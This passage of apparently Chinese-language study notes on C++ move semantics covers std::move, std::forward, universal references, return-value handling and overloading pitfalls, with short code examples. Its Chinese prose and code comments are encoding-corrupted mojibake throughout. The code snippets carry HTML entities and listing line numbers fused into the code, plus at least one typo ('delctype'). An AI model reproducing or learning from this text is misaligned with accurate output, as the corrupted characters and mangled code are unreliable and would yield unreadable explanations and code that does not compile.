é€’ç»™std::stringçš„ç§»åŠ¨æ„é€ å‡½æ•°ï¼Œå› ä¸ºç§»åŠ¨æ„é€ å‡½æ•°åªæ¥å—ä¸€ä¸ªæŒ‡å‘non-constçš„std::stringçš„å³å€¼å¼•ç”¨ã€‚ è¯¥å³å€¼å´å¯ä»¥è¢«ä¼ é€’ç»™std::stringçš„æ‹·è´æ„é€ å‡½æ•°ï¼Œå› ä¸ºlvalue-reference-to-constå…è®¸è¢«ç»‘å®šåˆ°ä¸€ä¸ªconstå³å€¼ä¸Šã€‚å› æ­¤ï¼Œstd::stringåœ¨æˆå‘˜åˆå§‹åŒ–çš„è¿‡ç¨‹ä¸­è°ƒç”¨äº†æ‹·è´æ„é€ å‡½æ•°ã€‚ å¯ä»¥æ€»ç»“å‡ºä¸¤ç‚¹ï¼š ç¬¬ä¸€ï¼Œä¸è¦åœ¨ä½ å¸Œæœ›èƒ½ç§»åŠ¨å¯¹è±¡çš„æ—¶å€™ï¼Œå£°æ˜ä»–ä»¬ä¸ºconstã€‚ ç¬¬äºŒï¼Œstd::moveä¸ä»…ä¸ç§»åŠ¨ä»»ä½•ä¸œè¥¿ï¼Œè€Œä¸”å®ƒä¹Ÿä¸ä¿è¯å®ƒæ‰§è¡Œè½¬æ¢çš„å¯¹è±¡å¯ä»¥è¢«ç§»åŠ¨ã€‚ std::forward ä¸std::moveæ€»æ˜¯æ— æ¡ä»¶çš„å°†å®ƒçš„å®å‚ä¸ºå³å€¼ä¸åŒï¼Œstd::forwardæ˜¯æœ‰æ¡ä»¶çš„è½¬æ¢ã€‚ æœ€å¸¸è§çš„æƒ…æ™¯æ˜¯ä¸€ä¸ªæ¨¡æ¿å‡½æ•°ï¼Œæ¥æ”¶ä¸€ä¸ªé€šç”¨å¼•ç”¨å½¢å‚ï¼ˆT&amp;&amp;ï¼‰ï¼Œå¹¶å°†å®ƒä¼ é€’ç»™å¦å¤–çš„å‡½æ•°ï¼š 123456789101112void process(const Widget&amp; lvalArg); //å¤„ç†å·¦å€¼void process(Widget&amp;&amp; rvalArg); //å¤„ç†å³å€¼template&lt;typename T&gt; //ç”¨ä»¥è½¬å‘paramåˆ°processçš„æ¨¡æ¿void logAndProcess(T&amp;&amp; param)&#123; auto now = //è·å–ç°åœ¨æ—¶é—´ std::chrono::system_clock::now(); makeLogEntry(\"Calling 'process'\", now); process(std::forward&lt;T&gt;(param));&#125; è€ƒè™‘ä¸¤æ¬¡å¯¹logAndProcessçš„è°ƒç”¨ï¼Œä¸€æ¬¡å·¦å€¼ä¸ºå®å‚ï¼Œä¸€æ¬¡å³å€¼ä¸ºå®å‚ï¼š 1234Widget w;logAndProcess(w); //ç”¨å·¦å€¼è°ƒç”¨logAndProcess(std::move(w)); //ç”¨å³å€¼è°ƒç”¨ std::forward å°†ä¿ç•™å®å‚çš„å€¼ç±»å‹ï¼Œä¼ é€’åˆ° process å‡½æ•°ï¼Œè°ƒç”¨æ­£ç¡®çš„å‡½æ•°é‡è½½ã€‚ å¯¹æ¯” è€ƒè™‘ä¸€ä¸ªç±»ï¼Œæˆ‘ä»¬å¸Œæœ›ç»Ÿè®¡æœ‰å¤šå°‘æ¬¡ç§»åŠ¨æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†ã€‚æˆ‘ä»¬åªéœ€è¦ä¸€ä¸ªstaticçš„è®¡æ•°å™¨ï¼Œå®ƒä¼šåœ¨ç§»åŠ¨æ„é€ çš„æ—¶å€™è‡ªå¢ã€‚å‡è®¾åœ¨è¿™ä¸ªç±»ä¸­ï¼Œå”¯ä¸€ä¸€ä¸ªéé™æ€çš„æ•°æ®æˆå‘˜æ˜¯std::stringï¼Œä¸€ç§ç»å…¸çš„ç§»åŠ¨æ„é€ å‡½æ•°ï¼ˆå³ï¼Œä½¿ç”¨std::moveï¼‰å¯ä»¥è¢«å®ç°å¦‚ä¸‹ï¼š 123456789101112class Widget &#123;public: Widget(Widget&amp;&amp; rhs) : s(std::move(rhs.s)) &#123; ++moveCtorCalls; &#125; â€¦private: static std::size_t moveCtorCalls; std::string s;&#125;; å¦‚æœè¦ç”¨std::forwardæ¥è¾¾æˆåŒæ ·çš„æ•ˆæœï¼Œä»£ç å¯èƒ½ä¼šçœ‹èµ·æ¥åƒï¼š 123456789class Widget&#123;public: Widget(Widget&amp;&amp; rhs) //ä¸è‡ªç„¶ï¼Œä¸åˆç†çš„å®ç° : s(std::forward&lt;std::string&gt;(rhs.s)) &#123; ++moveCtorCalls; &#125; â€¦&#125; std::forwardä¸ä½†éœ€è¦ä¸€ä¸ªå‡½æ•°å®å‚ï¼ˆrhs.sï¼‰ï¼Œè¿˜éœ€è¦ä¸€ä¸ªæ¨¡æ¿ç±»å‹å®å‚std::stringã€‚ std::moveçš„ä½¿ç”¨ä»£è¡¨ç€æ— æ¡ä»¶å‘å³å€¼çš„è½¬æ¢ï¼Œè€Œä½¿ç”¨std::forwardåªå¯¹ç»‘å®šäº†å³å€¼çš„å¼•ç”¨è¿›è¡Œåˆ°å³å€¼è½¬æ¢ã€‚è¿™æ˜¯ä¸¤ç§å®Œå…¨ä¸åŒçš„åŠ¨ä½œã€‚å‰è€…æ˜¯å…¸å‹åœ°ä¸ºäº†ç§»åŠ¨æ“ä½œï¼Œè€Œåè€…åªæ˜¯ä¼ é€’ï¼ˆäº¦ä¸ºè½¬å‘ï¼‰ä¸€ä¸ªå¯¹è±¡åˆ°å¦å¤–ä¸€ä¸ªå‡½æ•°ï¼Œä¿ç•™å®ƒåŸæœ‰çš„å·¦å€¼å±æ€§æˆ–å³å€¼å±æ€§ã€‚ ç»“è®º std::moveæ‰§è¡Œåˆ°å³å€¼çš„æ— æ¡ä»¶çš„è½¬æ¢ï¼Œä½†å°±è‡ªèº«è€Œè¨€ï¼Œå®ƒä¸ç§»åŠ¨ä»»ä½•ä¸œè¥¿ã€‚ std::forwardåªæœ‰å½“å®ƒçš„å‚æ•°è¢«ç»‘å®šåˆ°ä¸€ä¸ªå³å€¼æ—¶ï¼Œæ‰å°†å‚æ•°è½¬æ¢ä¸ºå³å€¼ã€‚ std::moveå’Œstd::forwardåœ¨è¿è¡ŒæœŸä»€ä¹ˆä¹Ÿä¸åšã€‚ 24 åŒºåˆ†é€šç”¨å¼•ç”¨ä¸å³å€¼å¼•ç”¨ ä¸ºäº†å£°æ˜ä¸€ä¸ªæŒ‡å‘æŸä¸ªç±»å‹Tçš„å³å€¼å¼•ç”¨ï¼Œä½ å†™ä¸‹äº†T&amp;&amp;ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ä¸€å®šæ˜¯ä¸€ä¸ªå³å€¼å¼•ç”¨ï¼š 123456789void f(Widget&amp;&amp; param); //å³å€¼å¼•ç”¨Widget&amp;&amp; var1 = Widget(); //å³å€¼å¼•ç”¨auto&amp;&amp; var2 = var1; //ä¸æ˜¯å³å€¼å¼•ç”¨template&lt;typename T&gt;void f(std::vector&lt;T&gt;&amp;&amp; param); //å³å€¼å¼•ç”¨template&lt;typename T&gt;void f(T&amp;&amp; param); //ä¸æ˜¯å³å€¼å¼•ç”¨ â€œT&amp;&amp;â€æœ‰ä¸¤ç§ä¸åŒçš„æ„æ€ã€‚ç¬¬ä¸€ç§ï¼Œå½“ç„¶æ˜¯å³å€¼å¼•ç”¨ã€‚å®ƒä»¬åªç»‘å®šåˆ°å³å€¼ä¸Šï¼Œå¹¶ä¸”å®ƒä»¬ä¸»è¦çš„å­˜åœ¨åŸå› å°±æ˜¯ä¸ºäº†è¯†åˆ«å¯ä»¥ç§»åŠ¨æ“ä½œçš„å¯¹è±¡ã€‚ â€œT&amp;&amp;â€çš„å¦ä¸€ç§æ„æ€æ˜¯ï¼Œå®ƒæ—¢å¯ä»¥æ˜¯å³å€¼å¼•ç”¨ï¼Œä¹Ÿå¯ä»¥æ˜¯å·¦å€¼å¼•ç”¨ã€‚å®ƒä»¬çš„äºŒé‡æ€§ä½¿å®ƒä»¬æ—¢å¯ä»¥ç»‘å®šåˆ°å³å€¼ä¸Šï¼ˆå°±åƒå³å€¼å¼•ç”¨ï¼‰ï¼Œä¹Ÿå¯ä»¥ç»‘å®šåˆ°å·¦å€¼ä¸Šï¼ˆå°±åƒå·¦å€¼å¼•ç”¨ï¼‰ã€‚ æ­¤å¤–ï¼Œå®ƒä»¬è¿˜å¯ä»¥ç»‘å®šåˆ°constæˆ–è€…non-constçš„å¯¹è±¡ä¸Šï¼Œä¹Ÿå¯ä»¥ç»‘å®šåˆ°volatileæˆ–è€…non-volatileçš„å¯¹è±¡ä¸Šï¼Œç”šè‡³å¯ä»¥ç»‘å®šåˆ°æ—¢conståˆvolatileçš„å¯¹è±¡ä¸Šã€‚å®ƒä»¬å¯ä»¥ç»‘å®šåˆ°å‡ ä¹ä»»ä½•ä¸œè¥¿ã€‚å®ƒå«åšé€šç”¨å¼•ç”¨ï¼ˆuniversal referencesï¼‰ã€‚ ä¸€äº›C++ç¤¾åŒºçš„æˆå‘˜å·²ç»å¼€å§‹å°†è¿™ç§é€šç”¨å¼•ç”¨ç§°ä¹‹ä¸ºè½¬å‘å¼•ç”¨ï¼ˆforwarding referencesï¼‰ é€šç”¨å¼•ç”¨ï¼Œå…¶ç‰¹æ€§æ˜¯å¼•ç”¨æŠ˜å å†³å®šçš„ã€‚ åˆå§‹åŒ– é€šç”¨å¼•ç”¨æ˜¯å¼•ç”¨ï¼Œæ‰€ä»¥å®ƒä»¬å¿…é¡»è¢«åˆå§‹åŒ–ã€‚ä¸€ä¸ªé€šç”¨å¼•ç”¨çš„åˆå§‹å€¼å†³å®šäº†å®ƒæ˜¯ä»£è¡¨äº†å³å€¼å¼•ç”¨è¿˜æ˜¯å·¦å€¼å¼•ç”¨ã€‚å¦‚æœåˆå§‹å€¼æ˜¯ä¸€ä¸ªå³å€¼ï¼Œé‚£ä¹ˆé€šç”¨å¼•ç”¨å°±ä¼šæ˜¯å¯¹åº”çš„å³å€¼å¼•ç”¨ï¼Œå¦‚æœåˆå§‹å€¼æ˜¯ä¸€ä¸ªå·¦å€¼ï¼Œé‚£ä¹ˆé€šç”¨å¼•ç”¨å°±ä¼šæ˜¯ä¸€ä¸ªå·¦å€¼å¼•ç”¨ã€‚å¯¹é‚£äº›æ˜¯å‡½æ•°å½¢å‚çš„é€šç”¨å¼•ç”¨æ¥è¯´ï¼Œåˆå§‹å€¼åœ¨è°ƒç”¨å‡½æ•°çš„æ—¶å€™è¢«æä¾›ï¼š 123456789template&lt;typename T&gt;void f(T&amp;&amp; param); //paramæ˜¯ä¸€ä¸ªé€šç”¨å¼•ç”¨Widget w;f(w); //ä¼ é€’ç»™å‡½æ•°fä¸€ä¸ªå·¦å€¼ï¼›paramçš„ç±»å‹ //å°†ä¼šæ˜¯Widget&amp;ï¼Œä¹Ÿå³å·¦å€¼å¼•ç”¨f(std::move(w)); //ä¼ é€’ç»™fä¸€ä¸ªå³å€¼ï¼›paramçš„ç±»å‹ä¼šæ˜¯ //Widget&amp;&amp;ï¼Œå³å³å€¼å¼•ç”¨ å¯¹ä¸€ä¸ªé€šç”¨å¼•ç”¨è€Œè¨€ï¼Œç±»å‹æ¨å¯¼æ˜¯å¿…è¦çš„ï¼Œä½†æ˜¯å…¶å¿…é¡»æ˜¯ T&amp;&amp; å½¢å¼ï¼Œå¦‚æœæ˜¯ std::vector&lt;T&gt;&amp;&amp; çš„å½¢å¼ï¼Œé‚£å°±å˜æˆäº† å³å€¼å¼•ç”¨ã€‚ è€Œå¦‚æœä¼ å…¥å·¦å€¼ï¼Œé‚£ä¹ˆæ˜¯ä¸èƒ½ä¼ å…¥å³å€¼å‚æ•°çš„ã€‚ ä¸€ä¸ªä¾‹å­ è€ƒè™‘å¦‚ä¸‹push_backæˆå‘˜å‡½æ•°ï¼Œæ¥è‡ªstd::vectorï¼š 1234567template&lt;class T, class Allocator = allocator&lt;T&gt;&gt; //æ¥è‡ªC++æ ‡å‡†class vector&#123;public: void push_back(T&amp;&amp; x); â€¦&#125; push_backå‡½æ•°çš„å½¢å‚å½“ç„¶æœ‰ä¸€ä¸ªé€šç”¨å¼•ç”¨çš„æ­£ç¡®å½¢å¼ï¼Œç„¶è€Œï¼Œåœ¨è¿™é‡Œå¹¶æ²¡æœ‰å‘ç”Ÿç±»å‹æ¨å¯¼ã€‚ç±»å‹æ¨å¯¼å‘ç”Ÿåœ¨ vector å®ä¾‹åŒ–æ—¶ã€‚ ä½œä¸ºå¯¹æ¯”ï¼Œstd::vectorå†…çš„æ¦‚å¿µä¸Šç›¸ä¼¼çš„æˆå‘˜å‡½æ•°emplace_backï¼Œå´ç¡®å®åŒ…å«ç±»å‹æ¨å¯¼: 1234567template&lt;class T, class Allocator = allocator&lt;T&gt;&gt; //ä¾æ—§æ¥è‡ªC++æ ‡å‡†class vector &#123;public: template &lt;class... Args&gt; void emplace_back(Args&amp;&amp;... args); â€¦&#125;; ç±»å‹å‚æ•°ï¼ˆtype parameterï¼‰Argsæ˜¯ç‹¬ç«‹äºvectorçš„ç±»å‹å‚æ•°Tçš„ï¼Œæ‰€ä»¥Argsä¼šåœ¨æ¯æ¬¡emplace_backè¢«è°ƒç”¨çš„æ—¶å€™è¢«æ¨å¯¼ã€‚ æ‰€ä»¥ï¼Œæ­¤æ—¶æ˜¯ä¸€ä¸ªé€šç”¨å¼•ç”¨ã€‚ auto&amp;&amp; ç±»å‹å£°æ˜ä¸ºauto&amp;&amp;çš„å˜é‡æ˜¯é€šç”¨å¼•ç”¨ï¼Œå› ä¸ºä¼šå‘ç”Ÿç±»å‹æ¨å¯¼ï¼Œå¹¶ä¸”å®ƒä»¬å…·æœ‰æ­£ç¡®å½¢å¼(T&amp;&amp;)ã€‚autoç±»å‹çš„é€šç”¨å¼•ç”¨ä¸å¦‚å‡½æ•°æ¨¡æ¿å½¢å‚ä¸­çš„é€šç”¨å¼•ç”¨å¸¸è§ï¼Œä½†æ˜¯å®ƒä»¬åœ¨C++11ä¸­å¸¸å¸¸çªç„¶å‡ºç°ã€‚è€Œå®ƒä»¬åœ¨C++14ä¸­å‡ºç°å¾—æ›´å¤šï¼Œå› ä¸ºC++14çš„lambdaè¡¨è¾¾å¼å¯ä»¥å£°æ˜auto&amp;&amp;ç±»å‹çš„å½¢å‚ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœä½ æƒ³å†™ä¸€ä¸ªC++14æ ‡å‡†çš„lambdaè¡¨è¾¾å¼ï¼Œæ¥è®°å½•ä»»æ„å‡½æ•°è°ƒç”¨çš„æ—¶é—´å¼€é”€ï¼Œä½ å¯ä»¥è¿™æ ·å†™ï¼š 123456789auto timeFuncInvocation = [](auto&amp;&amp; func, auto&amp;&amp;... params) //C++14 &#123; start timer; std::forward&lt;decltype(func)&gt;(func)( //å¯¹paramsè°ƒç”¨func std::forward&lt;delctype(params)&gt;(params)... ); stop timer and record elapsed time; &#125;; ç»“è®º å¦‚æœä¸€ä¸ªå‡½æ•°æ¨¡æ¿å½¢å‚çš„ç±»å‹ä¸ºtype&amp;&amp;ï¼Œå¹¶ä¸”typeéœ€è¦è¢«æ¨å¯¼å¾—çŸ¥ï¼Œæˆ–è€…å¦‚æœä¸€ä¸ªå¯¹è±¡è¢«å£°æ˜ä¸ºauto&amp;&amp;ï¼Œè¿™ä¸ªå½¢å‚æˆ–è€…å¯¹è±¡å°±æ˜¯ä¸€ä¸ªé€šç”¨å¼•ç”¨ã€‚ å¦‚æœç±»å‹å£°æ˜çš„å½¢å¼ä¸æ˜¯æ ‡å‡†çš„type&amp;&amp;ï¼Œæˆ–è€…å¦‚æœç±»å‹æ¨å¯¼æ²¡æœ‰å‘ç”Ÿï¼Œé‚£ä¹ˆtype&amp;&amp;ä»£è¡¨ä¸€ä¸ªå³å€¼å¼•ç”¨ã€‚ é€šç”¨å¼•ç”¨ï¼Œå¦‚æœå®ƒè¢«å³å€¼åˆå§‹åŒ–ï¼Œå°±ä¼šå¯¹åº”åœ°æˆä¸ºå³å€¼å¼•ç”¨ï¼›å¦‚æœå®ƒè¢«å·¦å€¼åˆå§‹åŒ–ï¼Œå°±ä¼šæˆä¸ºå·¦å€¼å¼•ç”¨ã€‚ 25 å¯¹å³å€¼å¼•ç”¨ä½¿ç”¨std::moveï¼Œå¯¹é€šç”¨å¼•ç”¨ä½¿ç”¨std::forward åœ¨å‚æ•°ä¼ é€’æ—¶ï¼Œstd::forwardæ˜¯æœ‰æ¡ä»¶çš„ä¼ é€’ï¼Œä¼šæ ¹æ®å‚æ•°çš„ç±»å‹ï¼Œä¼ é€’å®é™…çš„å‚æ•°å½¢å¼ï¼Œå³å€¼è¿˜æ˜¯å³å€¼ï¼Œå·¦å€¼è¿˜æ˜¯å·¦å€¼ã€‚ std::moveæ˜¯æ— æ¡ä»¶çš„å°†å…¶å˜ä¸ºå³å€¼ã€‚ æœ‰çš„æ—¶å€™ï¼Œå¹¶ä¸ä¸€å®šéœ€è¦å¯¹è±¡çš„ç§»åŠ¨æ“ä½œã€‚åŒºåˆ†ç§»åŠ¨å’Œæ‹·è´æ˜¯æœ‰å¿…è¦çš„ã€‚é‡åˆ°ä¸‹é¢è¿™ç§æƒ…å†µï¼š 12345678910class Widget &#123;public: void setName(const std::string&amp; newName) //ç”¨constå·¦å€¼è®¾ç½® &#123; name = newName; &#125; void setName(std::string&amp;&amp; newName) //ç”¨å³å€¼è®¾ç½® &#123; name = std::move(newName); &#125; â€¦&#125;; å¦‚æœä¸ç”¨ é€šç”¨å¼•ç”¨ï¼Œé‚£ä¹ˆå®ç°ä¼šå˜å¾—å†—é•¿ï¼Œå°¤å…¶æ˜¯å‚æ•°æ•°é‡è¾ƒå¤šçš„æ—¶å€™ã€‚ ä½¿ç”¨é€šç”¨å¼•ç”¨ + å®Œç¾è½¬å‘ std::forwardï¼Œé‚£ä¹ˆå®ç°ä¼šä¼˜é›…å¾—å¤šã€‚ å¹¶ä¸”å¯¹äºå˜å‚å‡½æ•°æ¨¡æ¿ï¼š 12345template&lt;class T, class... Args&gt; //æ¥è‡ªC++11æ ‡å‡†shared_ptr&lt;T&gt; make_shared(Args&amp;&amp;... args);template&lt;class T, class... Args&gt; //æ¥è‡ªC++14æ ‡å‡†unique_ptr&lt;T&gt; make_unique(Args&amp;&amp;... args); å¯¹äºè¿™ç§å‡½æ•°ï¼Œå¯¹äºå·¦å€¼å’Œå³å€¼åˆ†åˆ«é‡è½½å°±ä¸èƒ½è€ƒè™‘äº†ï¼šé€šç”¨å¼•ç”¨æ˜¯ä»…æœ‰çš„å®ç°æ–¹æ¡ˆã€‚å¯¹è¿™ç§å‡½æ•°ï¼Œæˆ‘å‘ä½ ä¿è¯ï¼Œè‚¯å®šä½¿ç”¨std::forwardä¼ é€’é€šç”¨å¼•ç”¨å½¢å‚ç»™å…¶ä»–å‡½æ•°ã€‚ è¿”å›å€¼çš„æƒ…å†µ å¦‚æœä½ åœ¨æŒ‰å€¼è¿”å›çš„å‡½æ•°ä¸­ï¼Œè¿”å›å€¼ç»‘å®šåˆ°å³å€¼å¼•ç”¨æˆ–è€…é€šç”¨å¼•ç”¨ä¸Šï¼Œéœ€è¦å¯¹è¿”å›çš„å¼•ç”¨ä½¿ç”¨std::moveæˆ–è€…std::forwardã€‚ 123456Matrix //æŒ‰å€¼è¿”å›operator+(Matrix&amp;&amp; lhs, const Matrix&amp; rhs)&#123; lhs += rhs; return std::move(lhs); //ç§»åŠ¨lhsåˆ°è¿”å›å€¼ä¸­&#125; é€šè¿‡åœ¨returnè¯­å¥ä¸­å°†lhsè½¬æ¢ä¸ºå³å€¼ï¼ˆé€šè¿‡std::moveï¼‰ï¼Œlhså¯ä»¥ç§»åŠ¨åˆ°è¿”å›å€¼çš„å†…å­˜ä½ç½®ã€‚å¦‚æœçœç•¥äº†std::moveè°ƒç”¨ï¼Œ 123456Matrix //åŒä¹‹å‰ä¸€æ ·operator+(Matrix&amp;&amp; lhs, const Matrix&amp; rhs)&#123; lhs += rhs; return lhs; //æ‹·è´lhsåˆ°è¿”å›å€¼ä¸­&#125; lhsæ˜¯ä¸ªå·¦å€¼çš„äº‹å®ï¼Œä¼šå¼ºåˆ¶ç¼–è¯‘å™¨æ‹·è´å®ƒåˆ°è¿”å›å€¼çš„å†…å­˜ç©ºé—´ã€‚ å‡å®šMatrixæ”¯æŒç§»åŠ¨æ“ä½œï¼Œå¹¶ä¸”æ¯”æ‹·è´æ“ä½œæ•ˆç‡æ›´é«˜ï¼Œåœ¨returnè¯­å¥ä¸­ä½¿ç”¨std::moveçš„ä»£ç æ•ˆç‡æ›´é«˜ã€‚ å¦‚æœMatrixä¸æ”¯æŒç§»åŠ¨æ“ä½œï¼Œå°†å…¶è½¬æ¢ä¸ºå³å€¼ä¸ä¼šå˜å·®ï¼Œå› ä¸ºå³å€¼å¯ä»¥ç›´æ¥è¢«Matrixçš„æ‹·è´æ„é€ å‡½æ•°æ‹·è´ã€‚ ä½¿ç”¨é€šç”¨å¼•ç”¨å’Œstd::forwardçš„æƒ…å†µç±»ä¼¼ã€‚è€ƒè™‘å‡½æ•°æ¨¡æ¿reduceAndCopyæ”¶åˆ°ä¸€ä¸ªæœªreduceï¼ˆunreducedï¼‰å¯¹è±¡Fractionï¼Œå°†å…¶è§„çº¦ï¼Œå¹¶è¿”å›ä¸€ä¸ªreduce (è§„çº¦ï¼Œå¥½éš¾å¬çš„åå­—) åçš„å‰¯æœ¬ã€‚ å¦‚æœåŸå§‹å¯¹è±¡æ˜¯å³å€¼ï¼Œå¯ä»¥å°†å…¶ç§»åŠ¨åˆ°è¿”å›å€¼ä¸­ï¼ˆé¿å…æ‹·è´å¼€é”€ï¼‰ï¼Œä½†æ˜¯å¦‚æœåŸå§‹å¯¹è±¡æ˜¯å·¦å€¼ï¼Œå¿…é¡»åˆ›å»ºå‰¯æœ¬ï¼Œå› æ­¤å¦‚ä¸‹ä»£ç ï¼š 1234567template&lt;typename T&gt;Fraction //æŒ‰å€¼è¿”å›reduceAndCopy(T&amp;&amp; frac) //é€šç”¨å¼•ç”¨çš„å½¢å‚&#123; frac.reduce(); return std::forward&lt;T&gt;(frac); //ç§»åŠ¨å³å€¼ï¼Œæˆ–æ‹·è´å·¦å€¼åˆ°è¿”å›å€¼ä¸­&#125; å¦‚æœstd::forwardè¢«å¿½ç•¥ï¼Œfracå°±è¢«æ— æ¡ä»¶å¤åˆ¶åˆ°reduceAndCopyçš„è¿”å›å€¼å†…å­˜ç©ºé—´ã€‚ æ³¨æ„ï¼Œå¯¹äºå‡½æ•°å†…éƒ¨çš„å±€éƒ¨å˜é‡ï¼Œè¿™æ˜¯ä¸æˆç«‹çš„ã€‚ 123456Widget makeWidget() //makeWidgetçš„â€œæ‹·è´â€ç‰ˆæœ¬&#123; Widget w; //å±€éƒ¨å¯¹è±¡ â€¦ //é…ç½®w return w; //â€œæ‹·è´â€wåˆ°è¿”å›å€¼ä¸­&#125; ä»–ä»¬æƒ³è¦â€œä¼˜åŒ–â€ä»£ç ï¼ŒæŠŠâ€œæ‹·è´â€å˜ä¸ºç§»åŠ¨ï¼š 123456Widget makeWidget() //makeWidgetçš„ç§»åŠ¨ç‰ˆæœ¬&#123; Widget w; â€¦ return std::move(w); //ç§»åŠ¨wåˆ°è¿”å›å€¼ä¸­ï¼ˆä¸è¦è¿™æ ·åšï¼ï¼‰&#125; å› ä¸ºæœ‰ RVO çš„å­˜åœ¨ï¼ŒmakeWidgetçš„â€œæ‹·è´â€ç‰ˆæœ¬å®é™…ä¸Šä¸æ‹·è´ä»»ä½•ä¸œè¥¿ã€‚åœ¨è¿”å›çš„åœ°å€ä¸Šï¼Œè¿›è¡Œå¯¹è±¡çš„æ„é€ ã€‚ ä½†æ˜¯ move ç‰ˆæœ¬ï¼Œä¸æ”¯æŒ RVOã€‚ è¿”å›çš„å·²ç»ä¸æ˜¯å±€éƒ¨å¯¹è±¡wï¼Œè€Œæ˜¯wçš„å¼•ç”¨â€”â€”std::move(w)çš„ç»“æœã€‚ ç»“è®º å¯¹äºä¼ å…¥å‡½æ•°çš„å½¢å‚ï¼Œåœ¨å‡½æ•°å†…æœ€åä¸€æ¬¡ä½¿ç”¨æ—¶ï¼Œåœ¨å³å€¼å¼•ç”¨ä¸Šä½¿ç”¨std::moveï¼Œåœ¨é€šç”¨å¼•ç”¨ä¸Šä½¿ç”¨std::forwardã€‚ å¯¹æŒ‰å€¼è¿”å›çš„å‡½æ•°è¦è¿”å›çš„å³å€¼å¼•ç”¨ä½¿ç”¨std::moveï¼Œå’Œé€šç”¨å¼•ç”¨ä½¿ç”¨std::forwardã€‚ å¦‚æœå±€éƒ¨å¯¹è±¡å¯ä»¥è¢«è¿”å›å€¼ä¼˜åŒ–æ¶ˆé™¤ï¼Œå°±ç»ä¸ä½¿ç”¨std::moveæˆ–è€…std::forwardã€‚ 26 é¿å…é‡è½½é€šç”¨å¼•ç”¨ å¼Šç«¯ä¸€ æ¯”å¦‚ï¼Œä¸‹é¢çš„ä¾‹å­ï¼š 1234567891011121314template&lt;typename T&gt;void logAndAdd(T&amp;&amp; name)&#123; auto now = std::chrono::system_clock::now(); log(now, \"logAndAdd\"); names.emplace(std::forward&lt;T&gt;(name));&#125;void logAndAdd(int idx) //æ–°çš„é‡è½½&#123; auto now = std::chrono::system_clock::now(); log(now, \"logAndAdd\"); names.emplace(nameFromIdx(idx));&#125; å¦‚æœæœ‰ä»¥ä¸‹è°ƒç”¨ï¼š 123short nameIdx;logAndAdd(nameIdx); //é”™è¯¯ï¼ ç”±äºæ²¡æœ‰ short ç±»å‹çš„é‡è½½ï¼Œä½†æ˜¯æœ‰é€šç”¨å¼•ç”¨å­˜åœ¨ï¼Œæ‰€ä»¥nameå½¢å‚ç»‘å®šåˆ°è¦ä¼ å…¥çš„shortä¸Šï¼Œç„¶ånameè¢«std::forwardç»™namesï¼ˆä¸€ä¸ªstd::multiset&lt;std::string&gt;ï¼‰çš„emplaceæˆå‘˜å‡½æ•°ï¼Œç„¶ååˆè¢«è½¬å‘ç»™std::stringæ„é€ å‡½æ•°ã€‚std::stringæ²¡æœ‰æ¥å—shortçš„æ„é€ å‡½æ•°ï¼Œæ‰€ä»¥logAndAddè°ƒç”¨é‡Œçš„multiset::emplaceè°ƒç”¨é‡Œçš„std::stringæ„é€ å‡½æ•°è°ƒç”¨å¤±è´¥ã€‚ æ‰€æœ‰è¿™ä¸€åˆ‡çš„åŸå› å°±æ˜¯å¯¹äºshortç±»å‹é€šç”¨å¼•ç”¨é‡è½½ä¼˜å…ˆäºintç±»å‹çš„é‡è½½ã€‚è¿™å¯¼è‡´äº†ä»£ç æ‰§è¡Œå‡ºé”™ã€‚ ä½¿ç”¨é€šç”¨å¼•ç”¨çš„å‡½æ•°åœ¨C++ä¸­æ˜¯æœ€è´ªå©ªçš„å‡½æ•°ã€‚å®ƒä»¬å‡ ä¹å¯ä»¥ç²¾ç¡®åŒ¹é…ä»»ä½•ç±»å‹çš„å®å‚ã€‚ é€šç”¨å¼•ç”¨çš„å®ç°ä¼šåŒ¹é…æ¯”å¼€å‘è€…é¢„æœŸè¦å¤šå¾—å¤šçš„å®å‚ç±»å‹ã€‚ å¼Šç«¯äºŒ æœ‰ä»¥ä¸‹Personç±»ï¼š 12345678910111213class Person &#123;public: template&lt;typename T&gt; explicit Person(T&amp;&amp; n) //å®Œç¾è½¬å‘çš„æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–æ•°æ®æˆå‘˜ : name(std::forward&lt;T&gt;(n)) &#123;&#125; explicit Person(int idx) //intçš„æ„é€ å‡½æ•° : name(nameFromIdx(idx)) &#123;&#125; â€¦private: std::string name;&#125;; å‡½æ•°æ¨¡æ¿èƒ½å®ä¾‹åŒ–äº§ç”Ÿä¸æ‹·è´å’Œç§»åŠ¨æ„é€ å‡½æ•°ä¸€æ ·çš„ç­¾åã€‚å¦‚æœæ‹·è´å’Œç§»åŠ¨æ„é€ è¢«ç”Ÿæˆï¼ŒPersonç±»çœ‹èµ·æ¥å°±åƒè¿™æ ·ï¼š 123456789101112class Person &#123;public: template&lt;typename T&gt; //å®Œç¾è½¬å‘çš„æ„é€ å‡½æ•° explicit Person(T&amp;&amp; n) : name(std::forward&lt;T&gt;(n)) &#123;&#125; explicit Person(int idx); //intçš„æ„é€ å‡½æ•° Person(const Person&amp; rhs); //æ‹·è´æ„é€ å‡½æ•° Person(Person&amp;&amp; rhs); //ç§»åŠ¨æ„é€ å‡½æ•° â€¦&#125;; å¦‚æœé€šè¿‡ non-constå·¦å€¼ç±»å‹çš„Person æ¥æ‹·è´æ„é€ ä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œå®Œç¾è½¬å‘çš„æ„é€ å‡½æ•°ä¼šä¼˜å…ˆåŒ¹é…ã€‚ å¦‚æœé€šè¿‡ constå·¦å€¼ç±»å‹çš„Person æ¥æ‹·è´æ„é€ ä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œæ‹·è´æ„é€ å‡½æ•°ä¼šä¼˜å…ˆåŒ¹é…ï¼Œå› ä¸ºè¿™æ˜¯ç²¾ç¡®åŒ¹é…ã€‚ å¦‚æœåœ¨ç»§æ‰¿å…³ç³»ä¸­ï¼Œä¼šæœ‰ä»¥ä¸‹è¡Œä¸ºï¼š 12345678910class SpecialPerson: public Person &#123;public: SpecialPerson(const SpecialPerson&amp; rhs) //æ‹·è´æ„é€ å‡½æ•°ï¼Œè°ƒç”¨åŸºç±»çš„ : Person(rhs) //åŸºç±»çš„å®Œç¾è½¬å‘æ„é€ å‡½æ•°ï¼ &#123; â€¦ &#125; SpecialPerson(SpecialPerson&amp;&amp; rhs) //ç§»åŠ¨æ„é€ 